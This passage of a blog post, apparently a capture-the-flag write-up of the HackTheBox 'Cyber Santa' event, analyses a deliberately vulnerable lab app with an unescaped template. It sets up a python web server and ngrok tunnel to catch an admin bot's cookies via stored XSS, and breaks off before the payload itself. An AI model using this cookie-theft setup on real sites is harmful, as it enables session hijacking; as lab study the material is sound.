<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HackTheBox CTF - Cyber Santa" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just bloggin cyber security related content." /><meta property="og:description" content="Just bloggin cyber security related content." /><link rel="canonical" href="https://rizemon.github.io/posts/htbcybersanta-ctf/" /><meta property="og:url" content="https://rizemon.github.io/posts/htbcybersanta-ctf/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-07T05:11:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox CTF - Cyber Santa" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/htbcybersanta-ctf/"},"description":"Just bloggin cyber security related content.","url":"https://rizemon.github.io/posts/htbcybersanta-ctf/","@type":"BlogPosting","headline":"HackTheBox CTF - Cyber Santa","dateModified":"2021-12-07T16:47:06+08:00","datePublished":"2021-12-07T05:11:00+08:00","@context":"https://schema.org"}</script><title>HackTheBox CTF - Cyber Santa | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox CTF - Cyber Santa</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox CTF - Cyber Santa</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 7, 2021, 5:11 AM +0800" > Dec 7, 2021 <i class="unloaded">2021-12-07T05:11:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 7, 2021, 4:47 PM +0800" > Dec 7, 2021 <i class="unloaded">2021-12-07T16:47:06+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="14575 words">80 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta.jpg" alt="" height="414px" width="615px" /></p><p>With the school semester just ended and the holiday break starting, I finally had the time to do something hacking-related. HackTheBox was publicising this CTF as “beginner-friendly” and I felt that it would be a great warmup to get rid of my rusty-ness. But turns out, I ended up learning a lot, especially in binary exploitation. Overall, I had a blast and I was satisfied with my performance after months of inactivity.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersantacert.png" alt="" /></p><h1 id="challenges">Challenges</h1><ul><li><a href="#toy-workshop-day-1">Web</a><ul><li><a href="#toy-workshop-day-1">Toy Workshop (Day 1)</a><li><a href="#toy-management-day-2">Toy Management (Day 2)</a><li><a href="#gadget-santa-day-3">Gadget Santa (Day 3)</a><li><a href="#elf-directory-day-4">Elf Directory (Day 4)</a><li><a href="#naughty-or-nice-day-5">Naughty or Nice (Day 5)</a></ul><li><a href="#mrsnowy-day-1">Pwn</a><ul><li><a href="#mrsnowy-day-1">MrSnowy (Day 1)</a><li><a href="#sleigh-day-2">Sleigh (Day 2)</a><li><a href="#naughty-list-day-3">Naughty List (Day 3)</a><li><a href="#minimelfistic-day-4">Minimelfistic (Day 4)</a></ul><li><a href="#common-mistake-day-1">Crypto</a><ul><li><a href="#common-mistake-day-1">Common Mistake (Day 1)</a><li><a href="#xmas-spirit-day-2">XMAS Spirit (Day 2)</a><li><a href="#missing-reindeer-day-3">Missing Reindeer (Day 3)</a></ul><li><a href="#infiltration-day-1">Reversing</a><ul><li><a href="#infiltration-day-1">Infiltration (Day 1)</a><li><a href="#gift-wrapping-day-2">Gift Wrapping (Day 2)</a><li><a href="#intercept-day-3">Intercept (Day 3)</a><li><a href="#upgraded-day-4">Upgraded (Day 4)</a></ul><li><a href="#baby-apt-day-1">Forensics</a><ul><li><a href="#baby-apt-day-1">baby APT (Day 1)</a><li><a href="#honeypot-day-2">Honeypot (Day 2)</a><li><a href="#persist-day-3">Persist (Day 3)</a><li><a href="#giveaway-day-4">Giveaway (Day 4)</a></ul></ul><h1 id="web">Web</h1><h2 id="toy-workshop-day-1">Toy Workshop (Day 1)</h2><blockquote><p>The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">web_toy_workshop.zip</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta1.png" alt="" /></p><p>When we click on any of the elfs, we are presented with a speech bubble where we could input a query and send it to the manager!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta2.png" alt="" /></p><p>Inputting anything and clicking <code class="language-plaintext highlighter-rouge">Send</code> will just return the message <code class="language-plaintext highlighter-rouge">Your message is delivered successfully!</code>.</p><p>Moving on, we opened the <code class="language-plaintext highlighter-rouge">web_toy_workshop.zip</code> file to get all the relevant files in the application.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>.
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── audio
│   │   │   └── ...
│   │   ├── css
│   │   │   ├── ...
│   │   ├── images
│   │   │   ├── ...
│   │   └── js
│   │       ├── ...
│   └── views
│       ├── index.hbs
│       └── queries.hbs
├── config
│   └── ...
└── Dockerfile
</pre></table></code></div></div><p>Zooming into the <code class="language-plaintext highlighter-rouge">challenge/bot.js</code> file, we see that it contains the code of the bot that pretends to be the manager.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">puppeteer</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">browser_options</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">headless</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
    <span class="na">args</span><span class="p">:</span> <span class="p">[</span>
        <span class="dl">'</span><span class="s1">--no-sandbox</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-background-networking</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-default-apps</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-extensions</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-gpu</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-sync</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--disable-translate</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--hide-scrollbars</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--metrics-recording-only</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--mute-audio</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--no-first-run</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--safebrowsing-disable-auto-update</span><span class="dl">'</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">--js-flags=--noexpose_wasm,--jitless</span><span class="dl">'</span>
    <span class="p">]</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="p">[{</span>
    <span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HTB{f4k3_fl4g_f0r_t3st1ng}</span><span class="dl">'</span>
<span class="p">}];</span>


<span class="kd">const</span> <span class="nx">readQueries</span> <span class="o">=</span> <span class="k">async</span> <span class="p">(</span><span class="nx">db</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">(</span><span class="nx">browser_options</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://127.0.0.1:1337/</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">(...</span><span class="nx">cookies</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://127.0.0.1:1337/queries</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">'</span><span class="s1">networkidle2</span><span class="dl">'</span>
    <span class="p">});</span>
    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">migrate</span><span class="p">();</span>
<span class="p">};</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">readQueries</span> <span class="p">};</span>
</pre></table></code></div></div><p>From the <code class="language-plaintext highlighter-rouge">readQueries()</code> function, we see that the manager will:<br /> 1) Visit the home page.<br /> 2) Set the cookies which contains the flag.<br /> 3) Visit the <code class="language-plaintext highlighter-rouge">/queries</code> page.</p><p>Since it will be visiting the <code class="language-plaintext highlighter-rouge">/queries</code> page, we can find the code for this route in <code class="language-plaintext highlighter-rouge">challenge/routes/index.js</code>.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span>        <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">router</span>         <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">bot</span>            <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../bot</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">db</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="nx">data</span> <span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/submit</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="kd">const</span> <span class="p">{</span> <span class="nx">query</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">query</span><span class="p">){</span>
        <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">addQuery</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">bot</span><span class="p">.</span><span class="nx">readQueries</span><span class="p">(</span><span class="nx">db</span><span class="p">);</span>
                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Your message is delivered successfully!</span><span class="dl">'</span><span class="p">));</span>
            <span class="p">});</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Please write your query first!</span><span class="dl">'</span><span class="p">));</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/queries</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">127.0.0.1</span><span class="dl">'</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">getQueries</span><span class="p">()</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">queries</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">queries</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="nx">queries</span> <span class="p">});</span>
        <span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Something went wrong!</span><span class="dl">'</span><span class="p">)));</span>
<span class="p">});</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">database</span> <span class="o">=&gt;</span> <span class="p">{</span> 
    <span class="nx">db</span> <span class="o">=</span> <span class="nx">database</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">router</span><span class="p">;</span>
<span class="p">};</span> 
</pre></table></code></div></div><p>From the code following the <code class="language-plaintext highlighter-rouge">router.get('/queries', ...)</code> line, we see that it will fetch all the queries from the database and attempt to render it using the <code class="language-plaintext highlighter-rouge">queries</code> template, which can found in <code class="language-plaintext highlighter-rouge">challenge/views/queries.hbs</code>.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;title&gt;</span>Toy Workshop<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"/static/images/logo.png"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/nes-core.min.css"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/dashboard.css"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/static/images/cflower.png"</span> <span class="na">class=</span><span class="s">"main-logo"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"pb-3"</span><span class="nt">&gt;</span>Welcome back, admin!<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"dash-frame"</span><span class="nt">&gt;</span>
            {{#each queries}}
            <span class="nt">&lt;p&gt;</span>{{{this.query}}}<span class="nt">&lt;/p&gt;</span>
            {{else}}
            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"empty"</span><span class="nt">&gt;</span>No content<span class="nt">&lt;/p&gt;</span>
            {{/each}}
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/static/js/jquery-3.6.0.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/static/js/auth.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span> 
</pre></table></code></div></div><p>We see that no escaping of dangerous characters is performed, meaning we could send a XSS payload and it will be rendered and executed!</p><p>To steal the cookies from the bot, we can get it to render an image from a URL that has its cookies appended to it.</p><p>To do so, we will need to host a external facing web server to receive the request. I’m going to be starting a local web server using <code class="language-plaintext highlighter-rouge">python3</code> and use <code class="language-plaintext highlighter-rouge">ngrok</code> to make it publicly accessible.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80 
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ngrok http 80
ngrok by @inconshreveable    <span class="o">(</span>Ctrl+C to quit<span class="o">)</span>
                                                                                                                                                        
Session Status                online                                                                                                                    
Session Expires               1 hour, 59 minutes                                                                                                        
Version                       2.3.40                                                                                                                    
Region                        United States <span class="o">(</span>us<span class="o">)</span>                                                                                                        
Web Interface                 http://127.0.0.1:4040                                                                                                     
Forwarding                    http://XXXX.ngrok.io -&gt; http://localhost:80                                                                
Forwarding                    https://XXXX.ngrok.io -&gt; http://localhost:80
</pre></table></code></div></div><p>With that done, we can send the following payload to the manager. (Replace the <code class="language-plaintext highlighter-rouge">XXXX</code> with the assigned subdomain from the <code class="language-plaintext highlighter-rouge">ngrok</code> output)</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
